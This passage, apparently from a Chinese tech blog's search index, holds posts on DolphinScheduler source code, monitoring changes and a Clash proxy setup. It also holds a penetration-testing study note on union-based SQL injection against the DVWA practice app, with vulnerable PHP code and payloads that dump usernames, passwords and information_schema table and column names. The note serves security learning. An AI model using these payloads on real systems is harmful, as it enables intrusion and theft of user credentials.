Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 根据流程图，我们可以看到了已经执行了如下红框的代码，也就是把我们的command已经缓存到了DB。 接下来需要看看Master的代码。 3.3 MasterServer DS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111@SpringBootApplication@ComponentScan(&quot;org.apache.dolphinscheduler&quot;)@EnableTransactionManagement@EnableCachingpublic class MasterServer implements IStoppable &#123; private static final Logger logger = LoggerFactory.getLogger(MasterServer.class); @Autowired private SpringApplicationContext springApplicationContext; @Autowired private MasterRegistryClient masterRegistryClient; @Autowired private TaskPluginManager taskPluginManager; @Autowired private MasterSchedulerService masterSchedulerService; @Autowired private SchedulerApi schedulerApi; @Autowired private EventExecuteService eventExecuteService; @Autowired private FailoverExecuteThread failoverExecuteThread; @Autowired private MasterRPCServer masterRPCServer; public static void main(String[] args) &#123; Thread.currentThread().setName(Constants.THREAD_NAME_MASTER_SERVER); SpringApplication.run(MasterServer.class); &#125;/** * 启动 master server */ @PostConstruct public void run() throws SchedulerException &#123;// 初始化 RPC服务 this.masterRPCServer.start();//安装任务插件 this.taskPluginManager.installPlugin();/*** MasterServer 注册客户端，用于连接到注册表并传递注册表事件。 * 当主节点启动时，它将在注册中心注册,并调度一个&#123;@link HeartBeatTask&#125;来更新注册表中的元数据**/ this.masterRegistryClient.init(); this.masterRegistryClient.start(); this.masterRegistryClient.setRegistryStoppable(this);// 主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。 this.masterSchedulerService.init(); this.masterSchedulerService.start(); this.eventExecuteService.start(); this.failoverExecuteThread.start();//这是调度器的接口，包含操作调度任务的方法。 this.schedulerApi.start(); Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125; &#125;)); &#125;/** * 优雅的关闭方法 * * @param cause 关闭的原因 */ public void close(String cause) &#123; try &#123;// set stop signal is true// execute only once if (!Stopper.stop()) &#123; logger.warn(&quot;MasterServer is already stopped, current cause: &#123;&#125;&quot;, cause); return; &#125; logger.info(&quot;Master server is stopping, current cause : &#123;&#125;&quot;, cause);// thread sleep 3 seconds for thread quietly stop ThreadUtils.sleep(Constants.SERVER_CLOSE_WAIT_TIME.toMillis());// close this.schedulerApi.close(); this.masterSchedulerService.close(); this.masterRPCServer.close(); this.masterRegistryClient.closeRegistry();// close spring Context and will invoke method with @PreDestroy annotation to destroy beans.// like ServerNodeManager,HostManager,TaskResponseService,CuratorZookeeperClient,etc springApplicationContext.close(); logger.info(&quot;MasterServer stopped, current cause: &#123;&#125;&quot;, cause); &#125; catch (Exception e) &#123; logger.error(&quot;MasterServer stop failed, current cause: &#123;&#125;&quot;, cause, e); &#125; &#125; @Override public void stop(String cause) &#123; close(cause); &#125;&#125; 在run方法里面，可以看到，主要依次执行了： **① MasterRPCServer.start()**：启动master的rpc服务； **② TaskPluginManager.installPlugin()**：安装任务插件； **③ MasterRegistryClient.start()**：向Zookeeper注册MasterServer； **④ MasterSchedulerService.start()**：主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。 **⑤ EventExecuteService.start()**：工作流实例执行情况 **⑥ FailoverExecuteThread()**：故障转移检测 **⑦ SchedulerApi.start()**：scheduler接口去操作任务实例 3.1.1 MasterRPCServer DS Master RPC Server主要用来发送或接收请求给其它系统。 初始化方法如下： 1234567891011121314151617181920212223@PostConstructprivate void init() &#123;// 初始化远程服务 NettyServerConfig serverConfig = new NettyServerConfig(); serverConfig.setListenPort(masterConfig.getListenPort()); this.nettyRemotingServer = new NettyRemotingServer(serverConfig); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RESPONSE, taskExecuteResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RUNNING, taskExecuteRunningProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_KILL_RESPONSE, taskKillResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.STATE_EVENT_REQUEST, stateEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_FORCE_STATE_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_WAKEUP_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.CACHE_EXPIRE, cacheProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_RECALL, taskRecallProcessor);// 日志服务 this.nettyRemotingServer.registerProcessor(CommandType.GET_LOG_BYTES_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.ROLL_VIEW_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.VIEW_WHOLE_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.REMOVE_TAK_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.start();&#125; 3.2.2 TaskPluginManager DS 到此部分源码解析完成整体流程运行 用户点击WEB界面的启动工作流按钮。 apiserver 封装 commnd 到 db（往 t_ds_command 表中插入一条数据）。 master 扫描到 commad，进行 dga 构建，初始化，将源头 task 提交到 priority 队列中。 taskConsumer 消费队列数据得到 task，选择一台 worker 分配任务。 worker 接收到分配任务的消息启动任务。 worker 返回结果给 master，master 更新任务信息到 db 。 03 DolphinScheduler源码剖析 3.1 apiserver任务执行入口 当用户在前端点击执行任务，则会向海豚调度的接口发送请求，最终由 ExecutorController 的 startProcessInstance 方法来处理请求。 ExecutorController.startProcessInstance() 方法。 最终会往 mysql 表 t_ds_command 插入一条数据，将要运行的工作流信息写入该表。 1234567891011121314151617181920212223242526272829303132333435363738394041424344@PostMapping(value = &quot;start-process-instance&quot;)@ResponseStatus(HttpStatus.OK)@ApiException(START_PROCESS_INSTANCE_ERROR)@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)public Result startProcessInstance(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(value = &quot;processDefinitionCode&quot;) long processDefinitionCode, @RequestParam(value = &quot;scheduleTime&quot;) String scheduleTime, @RequestParam(value = &quot;failureStrategy&quot;) FailureStrategy failureStrategy, @RequestParam(value = &quot;startNodeList&quot;, required = false) String startNodeList, @RequestParam(value = &quot;taskDependType&quot;, required = false) TaskDependType taskDependType, @RequestParam(value = &quot;execType&quot;, required = false) CommandType execType, @RequestParam(value = &quot;warningType&quot;) WarningType warningType, @RequestParam(value = &quot;warningGroupId&quot;, required = false, defaultValue = &quot;0&quot;) Integer warningGroupId, @RequestParam(value = &quot;runMode&quot;, required = false) RunMode runMode, @RequestParam(value = &quot;processInstancePriority&quot;, required = false) Priority processInstancePriority, @RequestParam(value = &quot;workerGroup&quot;, required = false, defaultValue = &quot;default&quot;) String workerGroup, @RequestParam(value = &quot;environmentCode&quot;, required = false, defaultValue = &quot;-1&quot;) Long environmentCode, @RequestParam(value = &quot;timeout&quot;, required = false) Integer timeout, @RequestParam(value = &quot;startParams&quot;, required = false) String startParams, @RequestParam(value = &quot;expectedParallelismNumber&quot;, required = false) Integer expectedParallelismNumber, @RequestParam(value = &quot;dryRun&quot;, defaultValue = &quot;0&quot;, required = false) int dryRun, @RequestParam(value = &quot;complementDependentMode&quot;, required = false) ComplementDependentMode complementDependentMode) &#123; if (timeout == null) &#123; timeout = Constants.MAX_TASK_TIMEOUT; &#125; Map&lt;String, String&gt; startParamMap = null; if (startParams != null) &#123; startParamMap = JSONUtils.toMap(startParams); &#125; if (complementDependentMode == null) &#123; complementDependentMode = ComplementDependentMode.OFF_MODE; &#125; //生成commnd信息入库 Map&lt;String, Object&gt; result = execService.execProcessInstance(loginUser, projectCode, processDefinitionCode, scheduleTime, execType, failureStrategy, startNodeList, taskDependType, warningType, warningGroupId, runMode, processInstancePriority, workerGroup, environmentCode, timeout, startParamMap, expectedParallelismNumber, dryRun, complementDependentMode); return returnDataList(result);&#125; 3.2 master 调度任务 3.2.1 master启动 DS MasterServer.run() 方法 启动 master 的工作线程 12345678910111213141516171819202122232425public void run() throws SchedulerException &#123;// init rpc serverthis.masterRPCServer.start();//启动netty rpc服务，与worker通信使用// install task pluginthis.taskPluginManager.loadPlugin();//加载taskplugin// self tolerantthis.masterRegistryClient.init();//加载高可用的一些注册信息this.masterRegistryClient.start();this.masterRegistryClient.setRegistryStoppable(this);//command扫描线程this.masterSchedulerBootstrap.init();this.masterSchedulerBootstrap.start();//事件处理线程this.eventExecuteService.start();this.failoverExecuteThread.start();//定时调度this.schedulerApi.start();Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125;&#125;));&#125; 3.2.2 command扫描 DS MasterSchedulerBootstrap.run()方法 该线程在3.2.1启动，启动之后，进入循环，一直扫描 command 表，查询出 command，然后封装成 processInstants 入库，创建 WorkflowExecuteRunnable (此对象后续很多地方用到) 写入到 workflowEventQueue 中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public void run() &#123; while (Stopper.isRunning()) &#123; try &#123; // todo: if the workflow event queue is much, we need to handle the back pressure boolean isOverload = OSUtils.isOverload(masterConfig.getMaxCpuLoadAvg(), masterConfig.getReservedMemory()); if (isOverload) &#123; MasterServerMetrics.incMasterOverload(); Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; List&lt;Command&gt; commands = findCommands(); if (CollectionUtils.isEmpty(commands)) &#123; // indicate that no command ,sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; //将command转换成processInstance,并入库 List&lt;ProcessInstance&gt; processInstances = command2ProcessInstance(commands); if (CollectionUtils.isEmpty(processInstances)) &#123; // indicate that the command transform to processInstance error, sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; MasterServerMetrics.incMasterConsumeCommand(commands.size()); processInstances.forEach(processInstance -&gt; &#123; try &#123; LoggerUtils.setWorkflowInstanceIdMDC(processInstance.getId()); if (processInstanceExecCacheManager.contains(processInstance.getId())) &#123; logger.error(&quot;The workflow instance is already been cached, this case shouldn&#x27;t be happened&quot;); &#125; WorkflowExecuteRunnable workflowRunnable = new WorkflowExecuteRunnable(processInstance, processService, nettyExecutorManager, processAlertManager, masterConfig, stateWheelExecuteThread, curingGlobalParamsService); processInstanceExecCacheManager.cache(processInstance.getId(), workflowRunnable);//processInstanceExecCacheManager设置进cache 被 workflowEventLoop获取 workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;); &#125; catch (InterruptedException interruptedException) &#123; logger.warn(&quot;Master schedule bootstrap interrupted, close the loop&quot;, interruptedException); Thread.currentThread().interrupt(); break; &#125; catch (Exception e) &#123; logger.error(&quot;Master schedule workflow error&quot;, e); // sleep for 1s here to avoid the database down cause the exception boom ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; &#125;&#125; }3.2.3 workerFlowEvent消费 DS 在 command 扫描线程中启动了 workflowEventLooper 线程用于消费 workerFlowEvent 。 MasterSchedulerBootstrap.start() 方法 1234567@Overridepublic synchronized void start() &#123; logger.info(&quot;Master schedule bootstrap starting..&quot;); super.start(); workflowEventLooper.start();//工作流调度线程启动 logger.info(&quot;Master schedule bootstrap started...&quot;);&#125; 从workflowEventQueue 拉取 workflowevent 事件，调用 workflowEventHandler 处理该事件。 WorkflowEventLooper.run()方法 12345678910111213141516171819202122232425262728293031323334public void run() &#123; WorkflowEvent workflowEvent = null; while (Stopper.isRunning()) &#123; try &#123; workflowEvent = workflowEventQueue.poolEvent();//拉取workflowevent LoggerUtils.setWorkflowInstanceIdMDC(workflowEvent.getWorkflowInstanceId()); logger.info(&quot;Workflow event looper receive a workflow event: &#123;&#125;, will handle this&quot;, workflowEvent); WorkflowEventHandler workflowEventHandler = workflowEventHandlerMap.get(workflowEvent.getWorkflowEventType());//获取workflowevent，处理workflowevent事件 workflowEventHandler.handleWorkflowEvent(workflowEvent); &#125; catch (InterruptedException e) &#123; logger.warn(&quot;WorkflowEventLooper thread is interrupted, will close this loop&quot;, e); Thread.currentThread().interrupt(); break; &#125; catch (WorkflowEventHandleException workflowEventHandleException) &#123; logger.error(&quot;Handle workflow event failed, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; catch (WorkflowEventHandleError workflowEventHandleError) &#123; logger.error(&quot;Handle workflow event error, will drop this event, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleError); &#125; catch (Exception unknownException) &#123; logger.error( &quot;Handle workflow event failed, get a unknown exception, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, unknownException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;&#125; 3.2.4 workerflow事件处理逻辑 DS 因为是START_WORKFLOW类型的所以获取到 WorkflowStartEventHandler.handleWorkflowEvent() 来处理该事件。 该方法中，获取 WorkflowExecuteRunnable ，运行异步任务调用 call 方法。 1234567891011121314151617181920212223242526272829303132@Overridepublic void handleWorkflowEvent(WorkflowEvent workflowEvent) throws WorkflowEventHandleError &#123; logger.info(&quot;Handle workflow start event, begin to start a workflow, event: &#123;&#125;&quot;, workflowEvent);//获取WorkflowExecuteRunnable WorkflowExecuteRunnable workflowExecuteRunnable = processInstanceExecCacheManager.getByProcessInstanceId(workflowEvent.getWorkflowInstanceId()); if (workflowExecuteRunnable == null) &#123; throw new WorkflowEventHandleError( &quot;The workflow start event is invalid, cannot find the workflow instance from cache&quot;); &#125; ProcessInstance processInstance = workflowExecuteRunnable.getProcessInstance(); ProcessInstanceMetrics.incProcessInstanceSubmit(); //异步调用call方法执行workflowExecute运行逻辑。 CompletableFuture&lt;WorkflowSubmitStatue&gt; workflowSubmitFuture = CompletableFuture.supplyAsync(workflowExecuteRunnable::call, workflowExecuteThreadPool); workflowSubmitFuture.thenAccept(workflowSubmitStatue -&gt; &#123; if (WorkflowSubmitStatue.SUCCESS == workflowSubmitStatue) &#123; // submit failed will resend the event to workflow event queue logger.info(&quot;Success submit the workflow instance&quot;);//监听返回状态是否成功 if (processInstance.getTimeout() &gt; 0) &#123;//是否超时 stateWheelExecuteThread.addProcess4TimeoutCheck(processInstance); &#125; &#125; else &#123;//出现异常，重试，重新进入队列，调用call方法 logger.error(&quot;Failed to submit the workflow instance, will resend the workflow start event: &#123;&#125;&quot;, workflowEvent); workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; &#125;);&#125; 3.2.5 workerflowRunnable运行逻辑 DS WorkflowExecuteRunnable.call() 初始化workerflow的有向无环图。 初始化任务调度配置 提交源头任务到任务优先级队列中。","categories":[{"name":"技术","slug":"技术","permalink":"https://sfyyh.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"https://sfyyh.github.io/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"https://sfyyh.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"https://sfyyh.github.io/tags/GitHub/"}]},{"title":"dolphinscheduler监控功能刨析","slug":"dolphinscheduler监控功能刨析","date":"2023-07-18T01:43:54.000Z","updated":"2023-08-04T01:46:07.073Z","comments":true,"path":"2023/07/18/dolphinscheduler监控功能刨析/","link":"","permalink":"https://sfyyh.github.io/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/","excerpt":"","text":"dolphinscheduler源码分析记录Dolphinscheduler-api-1MonitorController.java部分 任务一：新增功能获取master&#x2F;work服务器CPU核心数目以及一共磁盘大小， 任务二：分析如何向监控中心API中写入master&#x2F;work服务器CPU核心数目以及一共磁盘大小， 核心代码部分: 123456789101112131415/** * master list * * @param loginUser login user * @return master list */ @ApiOperation(value = &quot;listMaster&quot;, notes = &quot;MASTER_LIST_NOTES&quot;) @GetMapping(value = &quot;/masters&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(LIST_MASTERS_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result listMaster(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser) &#123; Map&lt;String, Object&gt; result = monitorService.queryMaster(loginUser); return returnDataList(result); &#125; MonitorService.java接口功能核心部分 1Map&lt;String, Object&gt; queryMaster(User loginUser); MonitorServiceImpl.java接口实现类核心部分 123456789101112131415/** * query master list * * @param loginUser login user * @return master information list */ @Override public Map&lt;String, Object&gt; queryMaster(User loginUser) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); List&lt;Server&gt; masterServers = getServerListFromRegistry(true); result.put(Constants.DATA_LIST, masterServers); putMsg(result, Status.SUCCESS); return result; &#125; result.put(Constants.*DATA_LIST*, masterServers); 语句中Constants.*DATA_LIST* 是前端json里的data数组部分，装入masterServers getServerListFromRegistry(true);方法 123456@Override public List&lt;Server&gt; getServerListFromRegistry(boolean isMaster) &#123; return isMaster ? registryClient.getServerList(NodeType.MASTER) : registryClient.getServerList(NodeType.WORKER); &#125; registryClient.getServerList(NodeType.*MASTER*) 获取master节点的服务信息列表 123456789101112131415161718192021222324252627282930313233343536373839404142public List&lt;Server&gt; getServerList(NodeType nodeType) &#123; Map&lt;String, String&gt; serverMaps = getServerMaps(nodeType, false); String parentPath = rootNodePath(nodeType); List&lt;Server&gt; serverList = new ArrayList&lt;&gt;(); for (Map.Entry&lt;String, String&gt; entry : serverMaps.entrySet()) &#123; String serverPath = entry.getKey(); String heartBeatJson = entry.getValue(); if (StringUtils.isEmpty(heartBeatJson)) &#123; logger.error(&quot;The heartBeatJson is empty, serverPath: &#123;&#125;&quot;, serverPath); continue; &#125; Server server = new Server(); switch (nodeType) &#123; case MASTER: MasterHeartBeat masterHeartBeat = JSONUtils.parseObject(heartBeatJson, MasterHeartBeat.class); server.setCreateTime(new Date(masterHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(masterHeartBeat.getReportTime())); server.setId(masterHeartBeat.getProcessId()); server.setCpuCoreCount(masterHeartBeat.getCpuCoreCount());//获取cpu核心数 break; case WORKER: WorkerHeartBeat workerHeartBeat = JSONUtils.parseObject(heartBeatJson, WorkerHeartBeat.class); server.setCreateTime(new Date(workerHeartBeat.getStartupTime())); server.setLastHeartbeatTime(new Date(workerHeartBeat.getReportTime())); server.setId(workerHeartBeat.getProcessId()); break; &#125; server.setResInfo(heartBeatJson); // todo: add host, port in heartBeat Info, so that we don&#x27;t need to parse this again server.setZkDirectory(parentPath + &quot;/&quot; + serverPath); // set host and port String[] hostAndPort = serverPath.split(COLON); String[] hosts = hostAndPort[0].split(DIVISION_STRING); // fetch the last one server.setHost(hosts[hosts.length - 1]); server.setPort(Integer.parseInt(hostAndPort[1])); serverList.add(server); &#125; return serverList; &#125; [MasterHeartBeat.java](http://MasterHeartBeat.java) master心跳 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * Licensed to the Apache Software Foundation (ASF) under one or more * contributor license agreements. See the NOTICE file distributed with * this work for additional information regarding copyright ownership. * The ASF licenses this file to You under the Apache License, Version 2.0 * (the &quot;License&quot;); you may not use this file except in compliance with * the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an &quot;AS IS&quot; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package org.apache.dolphinscheduler.common.model;import lombok.AllArgsConstructor;import lombok.Builder;import lombok.Data;import lombok.NoArgsConstructor;@Data@Builder@NoArgsConstructor@AllArgsConstructorpublic class MasterHeartBeat implements HeartBeat &#123; private long startupTime; private long reportTime; private double cpuUsage; private double memoryUsage; private double loadAverage; private double availablePhysicalMemorySize; private double maxCpuloadAvg; private double reservedMemory; private double diskAvailable; private int processId; // 新增核数 private int cpuCoreCount;&#125; 我们进一步深入解析 到这里 getHeartBeat() 方法这里开始调用最关键的一步.cpuCoreCount(OSUtils.getCPUCoreCount()) 真正的获取master节点核心cup数量","categories":[{"name":"技术","slug":"技术","permalink":"https://sfyyh.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"dolphinscheduler","slug":"dolphinscheduler","permalink":"https://sfyyh.github.io/tags/dolphinscheduler/"},{"name":"大数据分析平台","slug":"大数据分析平台","permalink":"https://sfyyh.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"},{"name":"GitHub","slug":"GitHub","permalink":"https://sfyyh.github.io/tags/GitHub/"}]},{"title":"Clash-for-linux使用教程","slug":"clash-for-linux","date":"2023-05-15T15:57:27.000Z","updated":"2023-08-15T16:06:28.465Z","comments":true,"path":"2023/05/15/clash-for-linux/","link":"","permalink":"https://sfyyh.github.io/2023/05/15/clash-for-linux/","excerpt":"","text":"使用教程下载项目下载项目 1$ git clone https://github.com/wanhebin/clash-for-linux.git 进入到项目目录，编辑.env文件，修改变量CLASH_URL的值。 12$ cd clash-for-linux$ vim .env 注意： .env 文件中的变量 CLASH_SECRET 为自定义 Clash Secret，值为空时，脚本将自动生成随机字符串。 启动程序直接运行脚本文件start.sh 进入项目目录 1$ cd clash-for-linux 运行启动脚本 1234567891011121314151617181920$ sudo bash start.sh正在检测订阅地址...Clash订阅地址可访问！ [ OK ]正在下载Clash配置文件...配置文件config.yaml下载成功！ [ OK ]正在启动Clash服务...服务启动成功！ [ OK ]Clash Dashboard 访问地址：http://&lt;ip&gt;:9090/uiSecret：xxxxxxxxxxxxx请执行以下命令加载环境变量: source /etc/profile.d/clash.sh请执行以下命令开启系统代理: proxy_on若要临时关闭系统代理，请执行: proxy_off 12$ source /etc/profile.d/clash.sh$ proxy_on 检查服务端口 12345$ netstat -tln | grep -E &#x27;9090|789.&#x27;tcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN tcp6 0 0 :::7890 :::* LISTEN tcp6 0 0 :::7891 :::* LISTEN tcp6 0 0 :::7892 :::* LISTEN 检查环境变量 123$ env | grep -E &#x27;http_proxy|https_proxy&#x27;http_proxy=http://127.0.0.1:7890https_proxy=http://127.0.0.1:7890 以上步鄹如果正常，说明服务clash程序启动成功，现在就可以体验高速下载github资源了。 重启程序如果需要对Clash配置进行修改，请修改 conf/config.yaml 文件。然后运行 restart.sh 脚本进行重启。 注意：重启脚本 restart.sh 不会更新订阅信息。 停止程序 进入项目目录 1$ cd clash-for-linux 关闭服务 1234$ sudo bash shutdown.sh服务关闭成功，请执行以下命令关闭系统代理：proxy_off 1$ proxy_off 然后检查程序端口、进程以及环境变量http_proxy|https_proxy，若都没则说明服务正常关闭。 Clash Dashboard 访问 Clash Dashboard 通过浏览器访问 start.sh 执行成功后输出的地址，例如：http://192.168.0.1:9090/ui 登录管理界面 在API Base URL一栏中输入：http:&#x2F;&#x2F;&lt;ip&gt;:9090 ，在Secret(optional)一栏中输入启动成功后输出的Secret。 点击Add并选择刚刚输入的管理界面地址，之后便可在浏览器上进行一些配置。 更多教程 此 Clash Dashboard 使用的是yacd项目，详细使用方法请移步到yacd上查询。 常见问题 部分Linux系统默认的 shell /bin/sh 被更改为 dash，运行脚本会出现报错（报错内容一般会有 -en [ OK ]）。建议使用 bash xxx.sh 运行脚本。 部分用户在UI界面找不到代理节点，基本上是因为厂商提供的clash配置文件是经过base64编码的，且配置文件格式不符合clash配置标准。 目前此项目已集成自动识别和转换clash配置文件的功能。如果依然无法使用，则需要通过自建或者第三方平台（不推荐，有泄露风险）对订阅地址转换。 程序日志中出现error: unsupported rule type RULE-SET报错，解决方法查看官方WIKI","categories":[{"name":"proxy","slug":"proxy","permalink":"https://sfyyh.github.io/categories/proxy/"}],"tags":[{"name":"clash","slug":"clash","permalink":"https://sfyyh.github.io/tags/clash/"}]},{"title":"渗透学习记录OS","slug":"渗透学习记录OS","date":"2022-12-25T14:58:29.000Z","updated":"2023-08-04T01:05:35.055Z","comments":true,"path":"2022/12/25/渗透学习记录OS/","link":"","permalink":"https://sfyyh.github.io/2022/12/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95OS/","excerpt":"","text":"mysql默认表相关知识在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、SCHEMATA 表字段 CHEMA_NAME 记录着库的信息 columns 存储该用户创建的所有数据库的库名、标名和字段名。 union联合注入攻击原理 步骤一：联合两表 ​ 1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断 常见方法： 1SELECT * FROM `users` WHERE user_id=1 order by 8 判断出字段数为8 然后通过 1SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8 进行联合查询 联合查询后面的语句 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user() select后面的数字可以替换成字段的名称或者函数 12-- 替换成mysql内置函数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5(&#x27;a&#x27;),version() 123456-- 替换成mysql数据库里的字段SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users-- 也可以在语句后面加上limit限定显示的行数SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2 12-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1 union联合注入攻击分析分析联合注入漏洞代码首先我们先分析构成联合注入攻击的sql注入代码 123456789101112131415161718192021222324252627&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input #这里传入的参数没有进行过滤直接进入sql语句 #从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符 $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values //显示查询成功后的内容 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; 判断是否存在联合注入​ 我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 1 和1‘ 判断出传入数据是字符串型 即存在注入漏洞 ​ 输入 1’and ‘1’&#x3D;’1 页面返回用户信息 1’and ‘1’&#x3D;’2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞. 判断字段数​ 使用语句order by确定当前表的字符数 ​ order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1 公式 order by n-1 1’ order by 1–+ 正常 1’ order by 2–+ 正常 1’ order by 3–+ 出错 正常页面 联合查询注入获取敏感信息​ 跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数 1-1&#x27; union select user,password from users-- 我们也可以使用group_concat（）函数来进行分组打印 1-1&#x27; union select 1,group_concat(user(),0x3A,version())-- 联合查询注入通过information_schema​ 在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询 第一个表： 这里的database（）函数是来限定查询的表是当前表 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- 第二个表： 1-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- 通过两个表的查询我们知道dvwa中含有的表为guestbook 和users 联合查询注入通过information_schema获取字段我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过 获取users表里的第一个字段名字 id 123-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1)-- -- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错-- Subquery returns more than 1 row 获取第二个字段名字 password 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1)-- 获取第三个字段名字 email 1-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1)-- 